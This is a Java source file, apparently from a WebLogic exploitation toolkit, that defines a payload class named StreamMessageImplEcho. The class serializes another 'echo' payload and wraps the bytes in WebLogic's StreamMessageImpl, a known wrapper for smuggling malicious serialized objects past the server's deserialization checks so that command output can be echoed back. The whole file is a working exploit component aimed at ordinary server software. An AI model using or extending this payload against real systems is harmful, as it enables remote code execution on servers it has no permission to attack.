package superman.payloads;

import superman.util.Serializer;
import weblogic.jms.common.StreamMessageImpl;

public class StreamMessageImplEcho implements EchoPayload<Object> {
    private EchoPayload payload;

    public StreamMessageImplEcho(EchoPayload payload) {
        this.payload = payload;
    }

    public Object getObject(Class echoClass) throws Exception {
        byte[] buf = Serializer.serialize(payload.getObject(echoClass));
        StreamMessageImpl obj = new StreamMessageImpl();
        obj.setDataBuffer(buf, buf.length);
        return obj;
    }

}
